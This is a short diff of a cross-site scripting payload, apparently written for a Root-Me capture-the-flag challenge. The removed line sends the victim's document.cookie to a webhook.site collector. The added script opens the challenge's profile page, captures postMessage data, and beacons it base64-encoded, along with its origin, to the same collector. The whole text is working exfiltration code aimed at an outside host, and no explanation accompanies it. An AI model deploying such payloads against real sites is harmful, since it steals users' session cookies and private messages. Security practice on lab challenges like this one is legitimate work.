@@ -1,1 +1,8 @@
-<script>document.location=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.cookie}`</script>
+<script>
+var wb = 'http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba';
+window.addEventListener('message', function(e) {
+  new Image().src = wb + '?msg=' + btoa(JSON.stringify(e.data)) + '&origin=' + encodeURIComponent(e.origin);
+});
+window.open('http://challenge01.root-me.org:58003/profile');
+setTimeout(function(){ new Image().src = wb + '?timeout=1'; }, 5000);
+</script>
